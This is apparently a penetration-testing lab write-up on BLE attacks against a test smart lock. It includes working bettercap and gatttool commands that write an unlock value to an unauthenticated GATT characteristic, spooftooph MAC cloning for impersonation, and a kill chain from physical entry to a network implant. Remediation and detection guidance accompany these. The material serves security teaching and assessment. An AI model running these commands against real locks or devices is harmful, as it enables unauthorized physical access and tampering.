> **English** | [Italiano](README.md)

# Bluetooth/BLE Spoofing - GATT Write and Device Impersonation

> - **Phase:** Wireless Security - Manipulation & Impersonation (BLE)
> - **Visibility:** Medium - writing to GATT characteristics is an apparently legitimate client connection; device impersonation requires cloning the advertising packets (detectable by comparing the active MACs)
> - **Prerequisites:** GATT enumeration completed with writable characteristics identified (see `../recon/`, WIFI-006); BLE adapter; for impersonation: BLE MAC spoofing capability
> - **Output:** WIFI-007; manipulation of the state of a BLE device (unauthorized command); impersonation of a trusted device; injection of values on unprotected characteristics

- **Operating Environment:** Kali Linux (Attacker), BLE dongle, lab IoT devices
- **Target:** Test smart lock with writable `Lock Control` characteristic (from WIFI-006)
- **Main tools:** bettercap (ble.write), gatttool, spooftooph

---

## Executive Summary

BLE spoofing turns the recon discovery (unprotected GATT characteristics, WIFI-006) into a concrete action on the device. There are two main vectors. The first, the unauthorized GATT write, writes directly to a writable characteristic to manipulate the state of the device - in the test case, to command a smart lock. The second, device impersonation, clones the BLE identity (MAC and advertising) of a trusted device to deceive the app or the ecosystem that expects to communicate with the original.

Finding WIFI-007 documents the unauthorized write to the `Lock Control` characteristic identified during the enumeration. It is the textbook example of the consequence of an IoT security model that delegates everything to the mobile application: if the BLE layer accepts writes without authentication, the app becomes irrelevant, because the attacker talks directly to the hardware.

This section demonstrates the most important principle of IoT security: security must be applied at the lowest possible layer (the device itself), not delegated to a higher level (the app) that the attacker can simply bypass.

---

## Folder Structure

```
spoofing/
+-- README.md      # this file: unauthorized GATT write + device impersonation (WIFI-007)
+-- img/           # screenshots of the device state manipulation
```

---

## Unauthorized GATT Write

**Finding ID:** `WIFI-007` | **Severity:** `Medium` (manipulation of the state of an unprotected BLE device; severity dependent on the criticality of the device: `High`/`Critical` for locks, medical devices, industrial controls)

### Operational Context

During the GATT enumeration (WIFI-006) the characteristic `Lock Control (ffe1)`, handle `0x0015`, was identified, with `WRITE` property and no authentication requirement. The lock's application logic interprets the value `01` as an unlock command. Since the BLE layer does not require pairing for the write, an attacker can send this command directly.

### PoC - Writing the unlock command

```Bash
# Direct write to the characteristic with bettercap
sudo bettercap
> ble.recon on
> ble.write 4c:65:a8:db:11:22 ffe1 01
```

```
[ble.write] writing 1 byte to characteristic ffe1 of 4c:65:a8:db:11:22
[ble.write] characteristic ffe1 written                       <-- command accepted
```

```Bash
# Alternative with gatttool
gatttool -b 4C:65:A8:DB:11:22 --char-write-req -a 0x0015 -n 01
```

```
Characteristic value was written successfully                 <-- lock unlocked (WIFI-007)
```

```Bash
# State verification via the status characteristic
gatttool -b 4C:65:A8:DB:11:22 --char-read -a 0x0018
```

```
Characteristic value/descriptor: 01        <-- Lock Status = unlocked (command executed)
```

### Remediation

- **Immediate action:** disable or protect the GATT characteristics that command physical functions; no sensitive command must be executable without application-level authentication
- **Structural action:** implement an application-level challenge-response mechanism on every sensitive command: the device generates a nonce, the app signs it with a key derived from the pairing, the device verifies before executing. This makes the direct write useless even if the BLE layer is accessible; adopt LE Secure Connections with MITM-protected pairing; apply rate limiting and command logging on the device side
- **Verification:** attempt the direct write with bettercap/gatttool after the hardening; the command must be rejected or ignored by the application logic

---

## Device Impersonation

### Operational Context

Impersonation clones the BLE identity of a trusted device (address and advertising) to deceive the ecosystem. If the mobile app or a hub identifies the trusted device only via MAC address and name (without cryptographic authentication), a clone can substitute for the original and receive commands or send falsified data.

```Bash
# Spoofing of the Bluetooth address of the attacker adapter
sudo spooftooph -i hci0 -a 4C:65:A8:DB:11:22
# The adapter now presents itself with the MAC of the target device
```

Impersonation is effective only against systems that trust the BLE identity without cryptographic verification. It is the BLE counterpart of the WiFi Evil Twin (`../../01-wifi (802.11)/rogue-ap/`): both exploit the absence of strong mutual authentication.

---

## Lab Experience

The most instructive part of the exercise was the triviality of the attack once the recon was completed. With the writable handle identified during the GATT enumeration, writing the unlock command was a single `ble.write` command. There was no cryptographic bypass, no exploit: the device simply accepted writes from anyone. This made concrete an abstract concept: most IoT vulnerabilities do not require sophisticated techniques, but exploit the total absence of controls.

An operational observation: the difficulty was mapping the correct value to write. The characteristic accepted writes, but understanding that `01` corresponded to "unlock" required observing the legitimate traffic between the app and the device (with sniffing) and some attempts. In a real attack this phase of reverse engineering of the application protocol is often the real bottleneck, not the access to the BLE layer.

---

## Theoretical Analysis: Why Security Must Be Applied at the Lowest Layer

The WIFI-007 attack illustrates the failure of the "security in depth" principle when applied badly. The manufacturer implemented security at the app level (user authentication, PIN, biometrics), but left the transport layer (BLE GATT) completely open. The implicit assumption - "only our app will talk to the device" - is false: any BLE client can connect and write.

The correct principle is that each layer must independently validate what it accepts, without trusting the higher layers. The physical device (the last link, the one that performs the irreversible action of unlocking) must be the last to verify the authorization, because it is the point the attacker must necessarily reach. Delegating this verification to the app means moving the control to a point the attacker can bypass.

This links to the BLE threat model: the radio channel is intrinsically accessible (anyone in range can connect), so security cannot depend on the inaccessibility of the channel but must be based on end-to-end authentication and encryption between the two legitimate endpoints. LE Secure Connections provides the cryptographic tools; it is up to the manufacturer to use them on every sensitive characteristic. The lesson, valid beyond BLE, is that security by obscurity or by delegation is always bypassable.

---

## Real-World Scenario: Post-Exploitation Projection

> This section describes how this finding would fit into a real engagement, from both the attacker (Red Team) and defender (Blue Team) perspectives.

### Attacker Perspective (Red Team)

**Starting point:** ability to manipulate the state of an unprotected BLE device (WIFI-007) - in the test, a smart lock.

**Immediate next step:** in a physical security context, the unlocking of the lock provides physical access to the building, which opens the entire physical attack chain (drop of a network implant, access to unlocked workstations).

**Projected kill chain:**

```
[WIFI-007] Control of unprotected BLE device (smart lock)
        |
        v
Physical access to the building / restricted area
        |
        v
Drop of an implant (Raspberry Pi, LAN turtle) on the internal network
        |
        v
Persistent internal foothold -> pivoting (07-post-exploitation)
```

**Potential impact:** BLE devices increasingly control critical physical functions (locks, gates, medical devices, industrial controls). An unauthenticated GATT write on a lock is equivalent to a universal key; on a medical device it can have consequences for people's safety. The vector links the wireless layer to physical security (`../../04-rfid-nfc (Physical Access)/`) and to internal network access.

### Defender Perspective (Blue Team)

**Detection:** most cheap BLE devices do not log connections or commands, making the attack hard to detect. Mature devices can log anomalous GATT connections (non-bonded MAC) and out-of-sequence commands.

**Indicators of Compromise (IOC):**
- GATT connections from a MAC not present in the list of bonded devices
- State commands (unlock) not correlated to an event of the legitimate app
- Duplicate advertising from the same MAC (possible impersonation)
- Application log showing actions without the corresponding user authentication

**Containment:** firmware update of the device to require authentication on the sensitive characteristics; disabling of the BLE functions if not essential; reduction of the transmission power.

**Eradication and hardening:**
- Firmware that imposes challenge-response on every sensitive command
- LE Secure Connections with mandatory bonding
- Logging and alerting on connections from unauthorized MACs
- Threat model that treats the BLE channel as public and untrusted

**Defensive lesson:** a device that performs irreversible physical actions must authenticate every command at its own level, regardless of which software is supposed to send it. The convenience of "one-time pairing" must not translate into "permanent and unconditional trust" toward anyone who speaks the protocol.

---

## Reference Tools

| Tool | Type | Technique/Access | Main use case |
| :--- | :--- | :--- | :--- |
| `bettercap` | MITM framework | CLI | `ble.write` module: writing to GATT characteristics (modern reference) |
| `gatttool` | GATT client | CLI | Direct write/read of GATT handles (legacy but precise) |
| `spooftooph` | BT address spoofer | CLI | Cloning of the Bluetooth address for impersonation |
| `nRF Connect` | BLE explorer | GUI / Mobile | Interactive write test on characteristics |
| `btlejack` | BLE hijacker | CLI | Hijacking of active BLE connections (with Micro:bit hardware) |

> **Recommended modern tool:** `bettercap` for GATT operations and `btlejack` (Damien Cauquil) for the hijacking of already-established BLE connections via BBC Micro:bit hardware. The [Flipper Zero](https://github.com/Nicholas-Arcari/FlipperZero-guide) with dedicated BLE apps covers some replay/impersonation scenarios in a portable way.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Impact | Manipulation of Control | `T0831` | Unauthorized write to a GATT characteristic to command a physical device (WIFI-007) |
| Collection | Adversary-in-the-Middle | `T1557` | Impersonation of a trusted BLE device to intercept or inject commands |
| Defense Evasion | Impersonation | `T1656` | Cloning of the BLE identity (MAC/advertising) of a legitimate device |
| Initial Access | Hardware Additions | `T1200` | Use of the BLE control to gain physical access (lock unlock) |

---

> **Note:** All documented activities were conducted on lab Bluetooth/BLE devices owned by the author. The manipulation via GATT write and the impersonation were performed exclusively against test devices. The unauthorized manipulation of third-party devices is a crime and, in the case of locks or security devices, may constitute serious crimes. Techniques are documented for educational and authorized security assessment purposes.
